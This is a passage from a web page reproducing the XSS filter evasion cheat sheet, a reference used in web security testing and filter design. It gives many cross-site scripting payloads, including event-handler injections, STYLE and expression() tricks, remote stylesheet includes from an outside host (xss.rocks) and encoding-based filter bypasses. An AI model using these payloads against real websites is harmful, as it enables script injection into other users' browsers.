<h2><a id="user-content-ecmascript-6" class="anchor" aria-hidden="true" href="#ecmascript-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ECMAScript 6</h2>
<pre><code>Set.constructor`alert\x28document.domain\x29```
</code></pre>
<h2><a id="user-content-body-tag" class="anchor" aria-hidden="true" href="#body-tag"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>BODY tag</h2>
<p>Method doesn't require using any variants of <code>javascript:</code> or <code>&lt;SCRIPT...</code> to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign (<code>onload=</code> != <code>onload =</code>):</p>
<pre><code>&lt;BODY ONLOAD=alert('XSS')&gt;
</code></pre>
<h2><a id="user-content-event-handlers" class="anchor" aria-hidden="true" href="#event-handlers"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Event Handlers</h2>
<p>It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.</p>
<p>The <a href="http://help.dottoro.com/" rel="nofollow">Dottoro Web Reference</a> also has a nice <a href="http://help.dottoro.com/ljfvvdnm.php" rel="nofollow">list of events in JavaScript</a>.</p>
<ol>
<li><code>FSCommand()</code> (attacker can use this when executed from within an
embedded Flash object)</li>
<li><code>onAbort()</code> (when user aborts the loading of an image)</li>
<li><code>onActivate()</code> (when object is set as the active element)</li>
<li><code>onAfterPrint()</code> (activates after user prints or previews print job)</li>
<li><code>onAfterUpdate()</code> (activates on data object after updating data in
the source object)</li>
<li><code>onBeforeActivate()</code> (fires before the object is set as the active
element)</li>
<li><code>onBeforeCopy()</code> (attacker executes the attack string right before a
selection is copied to the clipboard - attackers can do this with
the <code>execCommand("Copy")</code> function)</li>
<li><code>onBeforeCut()</code> (attacker executes the attack string right before a
selection is cut)</li>
<li><code>onBeforeDeactivate()</code> (fires right after the activeElement is
changed from the current object)</li>
<li><code>onBeforeEditFocus()</code> (Fires before an object contained in an
editable element enters a UI-activated state or when an editable
container object is control selected)</li>
<li><code>onBeforePaste()</code> (user needs to be tricked into pasting or be
forced into it using the <code>execCommand("Paste")</code> function)</li>
<li><code>onBeforePrint()</code> (user would need to be tricked into printing or
attacker could use the <code>print()</code> or <code>execCommand("Print")</code>
function).</li>
<li><code>onBeforeUnload()</code> (user would need to be tricked into closing the
browser - attacker cannot unload windows unless it was spawned from
the parent)</li>
<li><code>onBeforeUpdate()</code> (activates on data object before updating data in
the source object)</li>
<li><code>onBegin()</code> (the onbegin event fires immediately when the element's
timeline begins)</li>
<li><code>onBlur()</code> (in the case where another popup is loaded and window
looses focus)</li>
<li><code>onBounce()</code> (fires when the behavior property of the marquee object
is set to "alternate" and the contents of the marquee reach one side
of the window)</li>
<li><code>onCellChange()</code> (fires when data changes in the data provider)</li>
<li><code>onChange()</code> (select, text, or TEXTAREA field loses focus and its
value has been modified)</li>
<li><code>onClick()</code> (someone clicks on a form)</li>
<li><code>onContextMenu()</code> (user would need to right click on attack area)</li>
<li><code>onControlSelect()</code> (fires when the user is about to make a control
selection of the object)</li>
<li><code>onCopy()</code> (user needs to copy something or it can be exploited
using the <code>execCommand("Copy")</code> command)</li>
<li><code>onCut()</code> (user needs to copy something or it can be exploited using
the <code>execCommand("Cut")</code> command)</li>
<li><code>onDataAvailable()</code> (user would need to change data in an element,
or attacker could perform the same function)</li>
<li><code>onDataSetChanged()</code> (fires when the data set exposed by a data
source object changes)</li>
<li><code>onDataSetComplete()</code> (fires to indicate that all data is available
from the data source object)</li>
<li><code>onDblClick()</code> (user double-clicks a form element or a link)</li>
<li><code>onDeactivate()</code> (fires when the activeElement is changed from the
current object to another object in the parent document)</li>
<li><code>onDrag()</code> (requires that the user drags an object)</li>
<li><code>onDragEnd()</code> (requires that the user drags an object)</li>
<li><code>onDragLeave()</code> (requires that the user drags an object off a valid
location)</li>
<li><code>onDragEnter()</code> (requires that the user drags an object into a valid
location)</li>
<li><code>onDragOver()</code> (requires that the user drags an object into a valid
location)</li>
<li><code>onDragDrop()</code> (user drops an object (e.g. file) onto the browser
window)</li>
<li><code>onDragStart()</code> (occurs when user starts drag operation)</li>
<li><code>onDrop()</code> (user drops an object (e.g. file) onto the browser
window)</li>
<li><code>onEnd()</code> (the onEnd event fires when the timeline ends.</li>
<li><code>onError()</code> (loading of a document or image causes an error)</li>
<li><code>onErrorUpdate()</code> (fires on a databound object when an error occurs
while updating the associated data in the data source object)</li>
<li><code>onFilterChange()</code> (fires when a visual filter completes state
change)</li>
<li><code>onFinish()</code> (attacker can create the exploit when marquee is
finished looping)</li>
<li><code>onFocus()</code> (attacker executes the attack string when the window
gets focus)</li>
<li><code>onFocusIn()</code> (attacker executes the attack string when window gets
focus)</li>
<li><code>onFocusOut()</code> (attacker executes the attack string when window
looses focus)</li>
<li><code>onHashChange()</code> (fires when the fragment identifier part of the
document's current address changed)</li>
<li><code>onHelp()</code> (attacker executes the attack string when users hits F1
while the window is in focus)</li>
<li><code>onInput()</code> (the text content of an element is changed through the
user interface)</li>
<li><code>onKeyDown()</code> (user depresses a key)</li>
<li><code>onKeyPress()</code> (user presses or holds down a key)</li>
<li><code>onKeyUp()</code> (user releases a key)</li>
<li><code>onLayoutComplete()</code> (user would have to print or print preview)</li>
<li><code>onLoad()</code> (attacker executes the attack string after the window
loads)</li>
<li><code>onLoseCapture()</code> (can be exploited by the <code>releaseCapture()</code>
method)</li>
<li><code>onMediaComplete()</code> (When a streaming media file is used, this event
could fire before the file starts playing)</li>
<li><code>onMediaError()</code> (User opens a page in the browser that contains a
media file, and the event fires when there is a problem)</li>
<li><code>onMessage()</code> (fire when the document received a message)</li>
<li><code>onMouseDown()</code> (the attacker would need to get the user to click on
an image)</li>
<li><code>onMouseEnter()</code> (cursor moves over an object or area)</li>
<li><code>onMouseLeave()</code> (the attacker would need to get the user to mouse
over an image or table and then off again)</li>
<li><code>onMouseMove()</code> (the attacker would need to get the user to mouse
over an image or table)</li>
<li><code>onMouseOut()</code> (the attacker would need to get the user to mouse
over an image or table and then off again)</li>
<li><code>onMouseOver()</code> (cursor moves over an object or area)</li>
<li><code>onMouseUp()</code> (the attacker would need to get the user to click on
an image)</li>
<li><code>onMouseWheel()</code> (the attacker would need to get the user to use
their mouse wheel)</li>
<li><code>onMove()</code> (user or attacker would move the page)</li>
<li><code>onMoveEnd()</code> (user or attacker would move the page)</li>
<li><code>onMoveStart()</code> (user or attacker would move the page)</li>
<li><code>onOffline()</code> (occurs if the browser is working in online mode and
it starts to work offline)</li>
<li><code>onOnline()</code> (occurs if the browser is working in offline mode and
it starts to work online)</li>
<li><code>onOutOfSync()</code> (interrupt the element's ability to play its media
as defined by the timeline)</li>
<li><code>onPaste()</code> (user would need to paste or attacker could use the
<code>execCommand("Paste")</code> function)</li>
<li><code>onPause()</code> (the onpause event fires on every element that is active
when the timeline pauses, including the body element)</li>
<li><code>onPopState()</code> (fires when user navigated the session history)</li>
<li><code>onProgress()</code> (attacker would use this as a flash movie was
loading)</li>
<li><code>onPropertyChange()</code> (user or attacker would need to change an
element property)</li>
<li><code>onReadyStateChange()</code> (user or attacker would need to change an
element property)</li>
<li><code>onRedo()</code> (user went forward in undo transaction history)</li>
<li><code>onRepeat()</code> (the event fires once for each repetition of the
timeline, excluding the first full cycle)</li>
<li><code>onReset()</code> (user or attacker resets a form)</li>
<li><code>onResize()</code> (user would resize the window; attacker could auto
initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResizeEnd()</code> (user would resize the window; attacker could auto
initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResizeStart()</code> (user would resize the window; attacker could auto
initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResume()</code> (the onresume event fires on every element that becomes
active when the timeline resumes, including the body element)</li>
<li><code>onReverse()</code> (if the element has a repeatCount greater than one,
this event fires every time the timeline begins to play backward)</li>
<li><code>onRowsEnter()</code> (user or attacker would need to change a row in a
data source)</li>
<li><code>onRowExit()</code> (user or attacker would need to change a row in a data
source)</li>
<li><code>onRowDelete()</code> (user or attacker would need to delete a row in a
data source)</li>
<li><code>onRowInserted()</code> (user or attacker would need to insert a row in a
data source)</li>
<li><code>onScroll()</code> (user would need to scroll, or attacker could use the
<code>scrollBy()</code> function)</li>
<li><code>onSeek()</code> (the onreverse event fires when the timeline is set to
play in any direction other than forward)</li>
<li><code>onSelect()</code> (user needs to select some text - attacker could auto
initialize with something like:
<code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onSelectionChange()</code> (user needs to select some text - attacker
could auto initialize with something like:
<code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onSelectStart()</code> (user needs to select some text - attacker could
auto initialize with something like:
<code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onStart()</code> (fires at the beginning of each marquee loop)</li>
<li><code>onStop()</code> (user would need to press the stop button or leave the
webpage)</li>
<li><code>onStorage()</code> (storage area changed)</li>
<li><code>onSyncRestored()</code> (user interrupts the element's ability to play
its media as defined by the timeline to fire)</li>
<li><code>onSubmit()</code> (requires attacker or user submits a form)</li>
<li><code>onTimeError()</code> (user or attacker sets a time property, such as
dur, to an invalid value)</li>
<li><code>onTrackChange()</code> (user or attacker changes track in a playList)</li>
<li><code>onUndo()</code> (user went backward in undo transaction history)</li>
<li><code>onUnload()</code> (as the user clicks any link or presses the back
button or attacker forces a click)</li>
<li><code>onURLFlip()</code> (this event fires when an Advanced Streaming Format
(ASF) file, played by a HTML+TIME (Timed Interactive Multimedia
Extensions) media tag, processes script commands embedded in the
ASF file)</li>
<li><code>seekSegmentTime()</code> (this is a method that locates the specified
point on the element's segment time line and begins playing from
that point. The segment consists of one repetition of the time line
including reverse play using the AUTOREVERSE attribute.)</li>
</ol>
<h2><a id="user-content-bgsound" class="anchor" aria-hidden="true" href="#bgsound"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>BGSOUND</h2>
<pre><code>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content--javascript-includes" class="anchor" aria-hidden="true" href="#-javascript-includes"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>&amp; JavaScript includes</h2>
<pre><code>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
</code></pre>
<h2><a id="user-content-style-sheet" class="anchor" aria-hidden="true" href="#style-sheet"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE sheet</h2>
<pre><code>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-remote-style-sheet" class="anchor" aria-hidden="true" href="#remote-style-sheet"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote style sheet</h2>
<p>Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:</p>
<pre><code>&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;
</code></pre>
<h2><a id="user-content-remote-style-sheet-part-2" class="anchor" aria-hidden="true" href="#remote-style-sheet-part-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote style sheet part 2</h2>
<p>This works the same as above, but uses a <code>&lt;STYLE&gt;</code> tag instead of a <code>&lt;LINK&gt;</code> tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&gt;</code> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p>
<pre><code>&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;
</code></pre>
<h2><a id="user-content-remote-style-sheet-part-3" class="anchor" aria-hidden="true" href="#remote-style-sheet-part-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote style sheet part 3</h2>
<p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying <code>Link: &lt;http://xss.rocks/xss.css&gt;; REL=stylesheet</code>) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:</p>
<pre><code>&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;
</code></pre>
<h2><a id="user-content-remote-style-sheet-part-4" class="anchor" aria-hidden="true" href="#remote-style-sheet-part-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote style sheet part 4</h2>
<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:</p>
<pre><code>&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;
</code></pre>
<h2><a id="user-content-style-tags-with-broken-up-javascript-for-xss" class="anchor" aria-hidden="true" href="#style-tags-with-broken-up-javascript-for-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE tags with broken up JavaScript for XSS</h2>
<p>This XSS at times sends IE into an infinite loop of alerts:</p>
<pre><code>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
</code></pre>
<h2><a id="user-content-style-attribute-using-a-comment-to-break-up-expression" class="anchor" aria-hidden="true" href="#style-attribute-using-a-comment-to-break-up-expression"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE attribute using a comment to break up expression</h2>
<p>Created by Roman Ivanov</p>
<pre><code>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
</code></pre>
<h2><a id="user-content-img-style-with-expression" class="anchor" aria-hidden="true" href="#img-style-with-expression"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IMG STYLE with expression</h2>
<p>This is really a hybrid of the above XSS vectors, but it really does
show how hard STYLE tags can be to parse apart, like above this can send
IE into a loop:</p>
<pre><code>exp/*&lt;A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
</code></pre>
<h2><a id="user-content-style-tag-older-versions-of-netscape-only" class="anchor" aria-hidden="true" href="#style-tag-older-versions-of-netscape-only"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE tag (Older versions of Netscape only)</h2>
<pre><code>&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
</code></pre>
<h2><a id="user-content-style-tag-using-background-image" class="anchor" aria-hidden="true" href="#style-tag-using-background-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE tag using background-image</h2>
<pre><code>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
</code></pre>
<h2><a id="user-content-style-tag-using-background" class="anchor" aria-hidden="true" href="#style-tag-using-background"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>STYLE tag using background</h2>
<pre><code>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;

&lt;STYLE type="text/css"&gt;BODY{background:url("&lt;javascript:alert&gt;('XSS')")}&lt;/STYLE&gt;
</code></pre>
<h2><a id="user-content-anonymous-html-with-style-attribute" class="anchor" aria-hidden="true" href="#anonymous-html-with-style-attribute"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Anonymous HTML with STYLE attribute</h2>
<p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p>
<pre><code>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
</code></pre>
<h2><a id="user-content-local-htc-file" class="anchor" aria-hidden="true" href="#local-htc-file"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Local htc file</h2>
<p>This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:</p>
<pre><code>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
</code></pre>
<h2><a id="user-content-us-ascii-encoding" class="anchor" aria-hidden="true" href="#us-ascii-encoding"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>US-ASCII encoding</h2>
<p>US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.</p>
<pre><code>¼script¾alert(¢XSS¢)¼/script¾
</code></pre>
